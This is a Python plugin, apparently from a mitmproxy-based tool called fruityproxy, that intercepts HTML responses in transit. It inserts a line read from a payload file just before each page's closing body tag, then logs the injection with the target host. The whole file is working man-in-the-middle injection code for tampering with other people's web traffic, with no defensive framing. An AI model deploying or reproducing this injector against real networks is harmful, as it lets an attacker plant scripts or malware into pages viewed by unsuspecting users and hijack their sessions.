#!/usr/bin/env python

# Copyright (C) 2015 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os
from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer
try:
    from libmproxy.protocol.http import decoded # mitmproxy 0.12
except:
    from libmproxy.models import decoded # mitmproxy 0.15

import logging
from configobj import ConfigObj
from plugins.plugin import Plugin

logger = logging.getLogger("fruityproxy")

class InjectHTML(Plugin):
    name = "InjectHTML"
    version = "1.2"
    replace_str = "</body>"
    content_path = "content/InjectHTML/inject.txt"

    def request(self, request):
        pass
    
    def response(self, flow):
        pass
    
        f = open(self.content_path, "r")
        replace_content = f.readline()
        f.close()
        
        
        if "text/html" in flow.response.headers['Content-Type'][0]:       
            with decoded(flow.response):
                if self.replace_str in flow.response.content:
                    flow.response.content = flow.response.content.replace(self.replace_str, replace_content + self.replace_str)
                    logger.debug("["+self.name+"] Payload injected > " + flow.request.host)
        else:
            pass
            #print "- " + flow.response.headers['Content-Type'][0]